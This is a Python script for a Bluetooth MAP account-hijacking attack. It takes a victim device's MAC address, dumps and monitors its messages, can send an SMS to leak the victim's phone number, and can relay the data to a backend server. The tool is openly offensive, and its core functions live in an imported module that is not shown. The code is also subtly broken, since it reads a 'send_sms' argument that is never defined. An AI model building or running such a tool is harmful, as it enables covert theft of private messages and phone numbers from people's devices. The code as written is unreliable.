import argparse

from mapfunctions import MAPFunctions

class RelaySMS:

    def send_to_http_server(self, message):
        pass

    def on_sms_received(self, message):
        pass

    def on_phone_number_received(self, phone_number):
        pass

    def receive_event(self):
        pass



class MAPAccountHijack:

    def __init__(self, address, send_sms, backend, phone_number, sms_content, dest_dir):
        self.address = address
        self.send_sms = send_sms
        self.backend = backend
        self.phone_number = phone_number
        self.sms_content = sms_content
        self.dest_dir = dest_dir
        self.mapClient = MAPFunctions.get_map_client(self.address)
        self.mapFunctions = MAPFunctions(self.mapClient, self.backend, self.dest_dir)
    

    def map_account_hijack(self):

        if self.send_sms:
            self.mapFunctions.send_sms_message(self.phone_number)
        self.mapFunctions.dump_and_monitor(self.dest_dir)
        


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Map Account Hijack')
    parser.add_argument('--address', required=True, help='MAC address of the target device')
    parser.add_argument('--dest-dir', required=True, help='Destination directory, local, required')
    parser.add_argument('--phone-number', help='Phone number. If provided an SMS message will be sent to leak the phone number of a victim')
    parser.add_argument('--sms-content', help='SMS content, reserved for future functionality')
    parser.add_argument('--backend', help='Backend URL to relay information, if not provided the relay will not happen')

    args = parser.parse_args()

    # Access the values of the variables
    address = args.address
    send_sms = args.send_sms
    backend = args.backend
    phone_number = args.phone_number
    sms_content = args.sms_content
    dest_dir = args.dest_dir

    if address and dest_dir:
        mapAcc = MAPAccountHijack(address, send_sms, backend, phone_number, sms_content, dest_dir)
        mapAcc.map_account_hijack()
    else:
        parser.print_help()



